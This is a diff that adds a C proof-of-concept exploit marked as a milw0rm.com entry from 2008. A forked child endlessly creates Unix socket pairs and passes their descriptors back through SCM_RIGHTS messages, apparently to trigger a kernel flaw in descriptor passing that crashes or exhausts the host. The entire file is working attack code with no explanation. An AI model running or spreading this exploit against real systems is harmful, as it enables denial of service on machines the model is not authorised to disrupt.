@@ -1,0 +1,122 @@
+#include <sys/socket.h>
+#include <sys/un.h>
+#include <unistd.h>
+#include <assert.h>
+#include <err.h>
+#include <stdlib.h>
+
+static int own_child(int *us)
+{
+        int pid;
+        int s[2];
+        struct msghdr mh;
+        char crap[1024];
+        struct iovec iov;
+        struct cmsghdr *c;
+        int *fd;
+        int rc;
+
+        pid = fork();
+        if (pid == -1)
+                err(1, "fork()");
+
+        if (pid) {
+              close(us[1]);
+
+                return pid;
+        }
+
+        close(us[0]);
+
+        memset(&mh, 0, sizeof(mh));
+        iov.iov_base = "a";
+        iov.iov_len  = 1;
+
+        mh.msg_iov        = &iov;
+        mh.msg_iovlen     = 1;
+        mh.msg_control    = crap;
+        mh.msg_controllen = sizeof(crap);
+
+        c = CMSG_FIRSTHDR(&mh);
+        assert(c);
+
+        c->cmsg_level = SOL_SOCKET;
+        c->cmsg_type  = SCM_RIGHTS;
+
+        fd = (int*) CMSG_DATA(c);
+        assert(fd);
+
+        c->cmsg_len = CMSG_LEN(sizeof(int));
+        mh.msg_controllen = c->cmsg_len;
+
+        while (1) {
+                if (socketpair(PF_UNIX, SOCK_STREAM, 0, s) == -1)
+                        err(1, "socketpair()");
+
+                *fd = s[0];
+
+                rc = sendmsg(us[1], &mh, 0);
+                if (rc == -1)
+                        err(1, "sendmsg()");
+
+                if (rc != iov.iov_len)
+                        errx(1, "sent short");
+
+                close(s[0]);
+                close(us[1]);
+                us[1] = s[1];
+        }
+}
+
+static void own(void)
+{       
+        static int pid;
+        static int us[2];
+        char crap[1024];
+        char morte[1024];
+        struct cmsghdr *c;
+        int rc;
+        struct msghdr mh;
+        struct iovec iov;
+        int *fds;
+
+        if (!pid) {
+                if (socketpair(PF_UNIX, SOCK_STREAM, 0, us) == -1)
+                        err(1, "socketpair()");
+                pid = own_child(us);
+        }
+
+        iov.iov_base = morte;
+        iov.iov_len  = sizeof(morte);
+
+        memset(&mh, 0, sizeof(mh));
+        mh.msg_iov        = &iov;
+        mh.msg_iovlen     = 1;
+        mh.msg_control    = crap;
+        mh.msg_controllen = sizeof(crap);
+
+        rc = recvmsg(us[0], &mh, 0);
+        if (rc == -1)
+                err(1, "recvmsg()");
+
+        if (rc == 0)
+                errx(1, "EOF");
+
+        c = CMSG_FIRSTHDR(&mh);
+        assert(c);
+        assert(c->cmsg_type == SCM_RIGHTS);
+
+        fds = (int*) CMSG_DATA(c);
+        assert(fds);
+
+        close(us[0]);
+        us[0] = *fds;
+}
+
+int main(int argc, char *argv[])
+{
+	own();
+	exit(0);
+}
+
+// milw0rm.com [2008-11-11]
